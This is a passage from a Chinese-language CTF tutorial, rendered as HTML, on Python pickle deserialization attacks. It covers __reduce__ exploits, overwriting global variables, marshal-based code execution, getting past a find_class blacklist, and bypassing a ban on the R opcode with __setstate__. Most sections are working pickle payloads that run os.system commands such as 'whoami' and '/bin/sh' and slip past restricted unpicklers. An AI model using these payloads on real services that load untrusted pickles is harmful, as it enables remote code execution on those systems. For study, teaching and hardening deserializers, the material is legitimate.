+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">tttang</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="bp">self</span><span class="o">.</span><span class="n">name</span><span class="o">=</span><span class="s2">&#34;quan9i&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">a</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;c__main__</span><span class="se">\n</span><span class="s1">tttang</span><span class="se">\n</span><span class="s1">)</span><span class="se">\x81</span><span class="s1">}X</span><span class="se">\x0C\x00\x00\x00</span><span class="s1">__setstate__cos</span><span class="se">\n</span><span class="s1">system</span><span class="se">\n</span><span class="s1">sbX</span><span class="se">\x06\x00\x00\x00</span><span class="s1">whoamib.&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">b</span><span class="o">=</span><span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><img
+        
+        loading="lazy"
+        src="/img/pickle/8.png"
+        srcset="/img/pickle/8.png, /img/pickle/8.png 1.5x, /img/pickle/8.png 2x"
+        alt="/img/pickle/8.png"
+        title="/img/pickle/8.png" ></figure></p>
+<h3 id="__reduce__利用" class="headerLink">
+    <a href="#__reduce__%e5%88%a9%e7%94%a8" class="header-mark"></a>__reduce__利用</h3><p>这里也是过一下，CTF竞赛对pickle的利用多数是在<code>__reduce__</code>方法上。
+<figure><img
+        
+        loading="lazy"
+        src="/img/pickle/9.png"
+        srcset="/img/pickle/9.png, /img/pickle/9.png 1.5x, /img/pickle/9.png 2x"
+        alt="/img/pickle/9.png"
+        title="/img/pickle/9.png" ></figure>
+<figure><img
+        
+        loading="lazy"
+        src="/img/pickle/10.png"
+        srcset="/img/pickle/10.png, /img/pickle/10.png 1.5x, /img/pickle/10.png 2x"
+        alt="/img/pickle/10.png"
+        title="/img/pickle/10.png" ></figure>
+然后将其放给其他的程序去解析（不带reduce也可以）
+<figure><img
+        
+        loading="lazy"
+        src="/img/pickle/11.png"
+        srcset="/img/pickle/11.png, /img/pickle/11.png 1.5x, /img/pickle/11.png 2x"
+        alt="/img/pickle/11.png"
+        title="/img/pickle/11.png" ></figure>
+<figure><img
+        
+        loading="lazy"
+        src="/img/pickle/12.png"
+        srcset="/img/pickle/12.png, /img/pickle/12.png 1.5x, /img/pickle/12.png 2x"
+        alt="/img/pickle/12.png"
+        title="/img/pickle/12.png" ></figure></p>
+<p>可以看到也是可以正常执行的
+那么，如何过滤掉reduce呢？由于<code>__reduce__</code>方法对应的操作码是<code>R</code>，只需要<strong>把操作码<code>R</code>过滤掉</strong>就行了。这个可以很方便地利用<code>pickletools.genops</code>来实现。</p>
+<h3 id="全局变量覆盖" class="headerLink">
+    <a href="#%e5%85%a8%e5%b1%80%e5%8f%98%e9%87%8f%e8%a6%86%e7%9b%96" class="header-mark"></a>全局变量覆盖</h3><p>secret.py</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">key</span><span class="o">=</span><span class="s1">&#39;flag</span><span class="si">{xxx}</span><span class="s1">&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>exp</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">secret</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">=</span><span class="s1">&#39;&#39;&#39;c__main__
+</span></span></span><span class="line"><span class="cl"><span class="s1">secret
+</span></span></span><span class="line"><span class="cl"><span class="s1">(S&#39;key&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">S&#39;tttang&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">db.&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;before:&#39;</span><span class="p">,</span><span class="n">secret</span><span class="o">.</span><span class="n">key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">output</span><span class="o">=</span><span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;output:&#39;</span><span class="p">,</span><span class="n">output</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;after:&#39;</span><span class="p">,</span><span class="n">secret</span><span class="o">.</span><span class="n">key</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><img
+        
+        loading="lazy"
+        src="/img/pickle/13.png"
+        srcset="/img/pickle/13.png, /img/pickle/13.png 1.5x, /img/pickle/13.png 2x"
+        alt="/img/pickle/13.png"
+        title="/img/pickle/13.png" ></figure>
+可以看见最后输出的key被更改了
+这里还有一个例子</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">key1</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;321&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">key2</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;123&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">A</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="n">exec</span><span class="p">,(</span><span class="s2">&#34;key1=b&#39;1&#39;</span><span class="se">\n</span><span class="s2">key2=b&#39;2&#39;&#34;</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="n">A</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">pickle_a</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">pickle_a</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">pickle_a</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">key1</span><span class="p">,</span> <span class="n">key2</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><img
+        
+        loading="lazy"
+        src="/img/pickle/14.png"
+        srcset="/img/pickle/14.png, /img/pickle/14.png 1.5x, /img/pickle/14.png 2x"
+        alt="/img/pickle/14.png"
+        title="/img/pickle/14.png" ></figure>
+所以我们可以对其内容进行更改甚至执行命令</p>
+<h3 id="marshal反序列化另" class="headerLink">
+    <a href="#marshal%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e5%8f%a6" class="header-mark"></a>Marshal反序列化(另)</h3><p>由于<code>pickle</code>无法序列化<code>code</code>对象, 因此在<code>python2.6</code>后增加了一个<code>marshal</code>模块来处理<code>code</code>对象的序列化问题.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">marshal</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">demo</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">code_serialized</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">marshal</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">demo</span><span class="p">()))</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">code_serialized</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><img
+        
+        loading="lazy"
+        src="/img/pickle/15.png"
+        srcset="/img/pickle/15.png, /img/pickle/15.png 1.5x, /img/pickle/15.png 2x"
+        alt="/img/pickle/15.png"
+        title="/img/pickle/15.png" ></figure>
+但是<code>marshal</code>不能直接使用<code>__reduce__</code>, 因为<code>reduce</code>是利用调用某个<code>callable</code>并传递参数来执行的, 而<code>marshal</code>函数本身就是一个<code>callable</code>, 需要执行它, 而不是将他作为某个函数的参数.</p>
+<p>这时候就要利用上面分析的那个<code>PVM</code>操作码来进行构造了, 先写出来需要执行的内容, <code>Python</code>能通过<code>types.FunctionTyle(func_code,globals(),'')()</code>来动态地创建匿名函数, 这一部分的内容可以看<a href="https://docs.python.org/3/library/types.html" target="_blank" rel="noopener noreferrer">官方文档</a>的介绍.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">marshal</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">foo</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;whoami;/bin/sh&#39;</span><span class="p">)</span>     <span class="c1"># evil code</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">shell</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;ctypes
+</span></span></span><span class="line"><span class="cl"><span class="s2">FunctionType
+</span></span></span><span class="line"><span class="cl"><span class="s2">(cmarshal
+</span></span></span><span class="line"><span class="cl"><span class="s2">loads
+</span></span></span><span class="line"><span class="cl"><span class="s2">(cbase64
+</span></span></span><span class="line"><span class="cl"><span class="s2">b64decode
+</span></span></span><span class="line"><span class="cl"><span class="s2">(S&#39;</span><span class="si">%s</span><span class="s2">&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s2">tRtRc__builtin__
+</span></span></span><span class="line"><span class="cl"><span class="s2">globals
+</span></span></span><span class="line"><span class="cl"><span class="s2">(tRS&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s2">tR(tR.&#34;&#34;&#34;</span> <span class="o">%</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">marshal</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">foo</span><span class="o">.</span><span class="n">func_code</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">shell</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="waf绕过" class="headerLink">
+    <a href="#waf%e7%bb%95%e8%bf%87" class="header-mark"></a>WAF绕过</h2><h3 id="黑名单绕过find_class" class="headerLink">
+    <a href="#%e9%bb%91%e5%90%8d%e5%8d%95%e7%bb%95%e8%bf%87find_class" class="header-mark"></a>黑名单绕过(find_class)</h3><p>给出的一个waf写法</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">io</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">builtins</span>
+</span></span><span class="line"><span class="cl"><span class="n">__all__</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;PickleSerializer&#39;</span><span class="p">,)</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">RestrictedUnpickler</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">Unpickler</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">blacklist</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;eval&#39;</span><span class="p">,</span><span class="s1">&#39;exec&#39;</span><span class="p">,</span><span class="s1">&#39;open&#39;</span><span class="p">,</span><span class="s1">&#39;__import__&#39;</span><span class="p">,</span><span class="s1">&#39;exit&#39;</span><span class="p">,</span><span class="s1">&#39;input&#39;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">find_class</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">module</span><span class="p">,</span><span class="n">name</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">module</span> <span class="o">==</span> <span class="s2">&#34;builtins&#34;</span> <span class="ow">and</span> <span class="n">name</span> <span class="ow">not</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">blacklist</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">builtins</span><span class="p">,</span><span class="n">name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="n">pickle</span><span class="o">.</span><span class="n">UnpicklingError</span><span class="p">(</span><span class="s2">&#34;global &#39;</span><span class="si">%s</span><span class="s2">.</span><span class="si">%s</span><span class="s2">&#39; is forbidden&#34;</span><span class="o">%</span><span class="p">(</span><span class="n">module</span> <span class="p">,</span><span class="n">name</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>其实就是对<code>find_class</code>的输入进行了过滤。
+绕过的角度：</p>
+<ul>
+<li>从opcode角度看，当出现<code>c</code>、<code>i</code>、<code>\x93</code>时，会调用，<strong>所以只要在这三个opcode直接引入模块时没有违反规则即可</strong>。</li>
+<li>从python代码来看，<code>find_class()</code>只会在解析opcode时调用一次，所以只要绕过opcode执行过程，<code>find_class()</code>就不会再调用，也就是说<code>find_class()</code>只需要过一次，通过之后再产生的函数在黑名单中也不会拦截，<strong>所以可以通过<code>__import__</code>绕过一些黑名单。</strong>
+虽然这里设置了黑名单，但是这里可以发现getattr没有被ban掉，可以利用这个来获取builtins里面的函数。</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">builtins</span><span class="o">.</span><span class="n">getattr</span><span class="p">(</span><span class="n">builtins</span><span class="p">,</span> <span class="s1">&#39;eval&#39;</span><span class="p">),(</span><span class="s1">&#39;__import__(&#34;os&#34;).system(&#34;whoami&#34;)&#39;</span><span class="p">,)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>构造opcode
+首先就是构造出builtins,getattr</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">cbuiltins</span>
+</span></span><span class="line"><span class="cl"><span class="nb">getattr</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>接下来压入的话会发现，其中含有个对象，而其他压入的都是字符串，如果直接压入的话会出错(具体原因还在问)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">builtins</span> <span class="o">=</span> <span class="n">builtins</span><span class="o">.</span><span class="n">globals</span><span class="p">()</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;builtins&#39;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>最后构造出eval即可</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="sa">b</span><span class="s2">&#34;&#34;&#34;cbuiltins
+</span></span></span><span class="line"><span class="cl"><span class="s2">getattr
+</span></span></span><span class="line"><span class="cl"><span class="s2">(cbuiltins
+</span></span></span><span class="line"><span class="cl"><span class="s2">getattr
+</span></span></span><span class="line"><span class="cl"><span class="s2">(cbuiltins
+</span></span></span><span class="line"><span class="cl"><span class="s2">dict
+</span></span></span><span class="line"><span class="cl"><span class="s2">S&#39;get&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s2">tR(cbuiltins
+</span></span></span><span class="line"><span class="cl"><span class="s2">globals
+</span></span></span><span class="line"><span class="cl"><span class="s2">(tRS&#39;builtins&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s2">tRS&#39;eval&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s2">tRp1
+</span></span></span><span class="line"><span class="cl"><span class="s2">(S&#39;__import__(&#34;os&#34;).system(&#34;whoami&#34;)&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s2">tR.&#34;&#34;&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>其实这个也是对于R操作符的妙用</p>
+<h3 id="全局变量包含c指令码的妙用" class="headerLink">
+    <a href="#%e5%85%a8%e5%b1%80%e5%8f%98%e9%87%8f%e5%8c%85%e5%90%abc%e6%8c%87%e4%bb%a4%e7%a0%81%e7%9a%84%e5%a6%99%e7%94%a8" class="header-mark"></a>全局变量包含：<code>c</code>指令码的妙用</h3><p>例如题目对R进行了过滤那么该如何做呢？（这里还是取师傅的题目例子）
+<figure><img
+        
+        loading="lazy"
+        src="/img/pickle/16.png"
+        srcset="/img/pickle/16.png, /img/pickle/16.png 1.5x, /img/pickle/16.png 2x"
+        alt="/img/pickle/16.png"
+        title="/img/pickle/16.png" ></figure>
+这个时候可以利用c-》可以用来获取一个全局变量
+以name的为例，只需要把硬编码的<code>rxz</code>改成从<code>blue</code>引入的<code>name</code>，写成指令就是：<code>cblue\nname\n</code>。把用于编码<code>rxz</code>的<code>X\x03\x00\x00\x00rxz</code>替换成我们的这个global指令即可</p>
+<h3 id="module限制" class="headerLink">
+    <a href="#module%e9%99%90%e5%88%b6" class="header-mark"></a>module限制</h3><p>如果出题人只允许<code>c</code>指令包含<code>__main__</code>这一个module，这道题又该如何解决呢？
+这里采用的方法是先写入后篡改的方法</p>
+<ul>
+<li>通过<code>__main__.blue</code>引入这一个module，由于命名空间还在main内，故不会被拦截</li>
+<li>把一个dict压进栈，内容是<code>{'name': 'rua', 'grade': 'www'}</code></li>
+<li>执行BUILD指令，会导致改写 <code>__main__.blue.name</code>和 <code>__main__.blue.grade</code> ，至此<code>blue.name</code>和<code>blue.grade</code>已经被篡改成我们想要的内容</li>
+<li>弹掉栈顶，现在栈变成空的</li>
+<li>照抄正常的Student序列化之后的字符串，压入一个正常的Student对象，name和grade分别是&rsquo;rua&rsquo;和&rsquo;www'
+这个地方其实就是对<code>b</code>操作符的妙用</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">payload = b&#39;\x80\x03c__main__\nblue\n}(Vname\nVrua\nVgrade\nVwww\nub0c__main__\nStudent\n)\x81}(X\x04\x00\x00\x00nameX\x03\x00\x00\x00ruaX\x05\x00\x00\x00gradeX\x03\x00\x00\x00wwwub.&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里把b操作符再贴一次出来
+<figure><img
+        
+        loading="lazy"
+        src="/img/pickle/18.png"
+        srcset="/img/pickle/18.png, /img/pickle/18.png 1.5x, /img/pickle/18.png 2x"
+        alt="/img/pickle/18.png"
+        title="/img/pickle/18.png" ></figure></p>
+<h3 id="bypass-reduce" class="headerLink">
+    <a href="#bypass-reduce" class="header-mark"></a>bypass reduce</h3><p>那么如果R被禁用了（也就是reduce被禁用）那么如何绕过
+之前谈到过，<code>__reduce__</code>与<code>R</code>指令是绑定的，禁止了<code>R</code>指令就禁止了<code>__reduce__</code> 方法。那么，在禁止<code>R</code>指令的情况下，我们还能RCE吗？</p>
+<p>　　现在的目标是，利用指令码，构造出任意命令执行。那么我们需要找到一个函数调用<code>fun(arg)</code>，其中<code>fun</code>和<code>arg</code>都必须可控。
+可以看到上一个部分的load_build函数的定义：</p>
+<p>这里的实现方式也就是上文的注所提到的：如果<code>inst</code>拥有<code>__setstate__</code>方法，则把<code>state</code>交给<code>__setstate__</code>方法来处理；否则的话，直接把<code>state</code>这个<code>dist</code>的内容，合并到<code>inst.__dict__</code> 里面。
+它有什么安全隐患呢？我们来想想看：<code>Student</code>原先是没有<code>__setstate__</code>这个方法的。那么我们利用<code>{'__setstate__': os.system}</code>来BUILE这个对象，那么现在对象的<code>__setstate__</code>就变成了<code>os.system</code>；接下来利用<code>&quot;ls /&quot;</code>来再次BUILD这个对象，则会执行<code>setstate(&quot;ls /&quot;)</code> ，而此时<code>__setstate__</code>已经被我们设置为<code>os.system</code>，因此实现了RCE.
+然后这里也是可以反弹shell的</p>
+<h2 id="pickle-opcode使用方法与示例" class="headerLink">
+    <a href="#pickle-opcode%e4%bd%bf%e7%94%a8%e6%96%b9%e6%b3%95%e4%b8%8e%e7%a4%ba%e4%be%8b" class="header-mark"></a>pickle opcode使用方法与示例</h2><ol>
+<li>pker中的针对pickle的特殊语法需要重点掌握（后文给出示例）</li>
+<li>此外我们需要注意一点：python中的所有类、模块、包、属性等都是对象，这样便于对各操作进行理解。</li>
+<li>pker主要用到<code>GLOBAL、INST、OBJ</code>三种特殊的函数以及一些必要的转换方式，其他的opcode也可以手动使用：</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">以下module都可以是包含</span><span class="err">`</span><span class="o">.</span><span class="err">`</span><span class="n">的子module</span>
+</span></span><span class="line"><span class="cl"><span class="n">调用函数时</span><span class="err">，</span><span class="n">注意传入的参数类型要和示例一致</span>
+</span></span><span class="line"><span class="cl"><span class="n">对应的opcode会被生成</span><span class="err">，</span><span class="n">但并不与pker代码相互等价</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">GLOBAL</span>
+</span></span><span class="line"><span class="cl"><span class="n">对应opcode</span><span class="err">：</span><span class="sa">b</span><span class="s1">&#39;c&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">获取module下的一个全局对象</span><span class="err">（</span><span class="n">没有import的也可以</span><span class="err">，</span><span class="n">比如下面的os</span><span class="err">）：</span>
+</span></span><span class="line"><span class="cl"><span class="n">GLOBAL</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">,</span> <span class="s1">&#39;system&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">输入</span><span class="err">：</span><span class="n">module</span><span class="p">,</span><span class="n">instance</span><span class="p">(</span><span class="n">callable</span><span class="err">、</span><span class="n">module都是instance</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">INST</span>
+</span></span><span class="line"><span class="cl"><span class="n">对应opcode</span><span class="err">：</span><span class="sa">b</span><span class="s1">&#39;i&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">建立并入栈一个对象</span><span class="err">（</span><span class="n">可以执行一个函数</span><span class="err">）：</span>
